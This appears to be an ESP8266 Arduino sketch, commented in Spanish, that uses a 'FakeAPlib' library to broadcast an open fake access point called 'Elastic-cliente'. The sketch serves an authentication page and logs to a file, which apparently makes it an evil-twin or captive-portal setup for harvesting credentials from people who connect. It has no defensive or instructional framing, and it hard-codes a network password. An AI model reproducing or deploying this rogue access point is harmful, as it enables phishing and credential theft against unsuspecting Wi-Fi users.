#define LOG_FILE "/data/logs.txt"

#include <FakeAPlib.h>


//variable para el nombre del wifi
const char* SSID      = "Elastic-cliente";
const char* WIFI_SSID = "ESP.local-server";
const char* WIFI_PSW  = "SECUREhash9361";

const char* AUTH_PAGE  = "/webpages/index.html";

IPAddress* apip = new IPAddress(192,168,1,1);
//byte apmac[6];

FakeAP* accessPoint = new FakeAP(80);
int printed = 0;


void setup()
{
  Serial.begin(115200);
  Serial.setDebugOutput(true);
  delay(2000);

  Serial.println("Cargando....");
  delay(1000);
  
  accessPoint->setPath(AUTH_PAGE,  INDEXPAGE);

  WiFi.mode(WIFI_AP);
  WiFi.hostname("ESP.server");
  WiFi.softAPConfig(*apip, *apip, IPAddress(255, 255, 255, 0));
  if (!accessPoint->initialize(SSID, "", WIFI_SSID, WIFI_PSW))
    Serial.println("Error en la configuración del punto de acceso");

  Serial.println("Configuración acabada!");

}

void loop()
{
  accessPoint->process();

  if (printed<=0){
    Serial.printf("server ip: %s\n", accessPoint->getServerIp().toString().c_str());
    Serial.println("En espera de clientes....");
    printed++;
  }

}
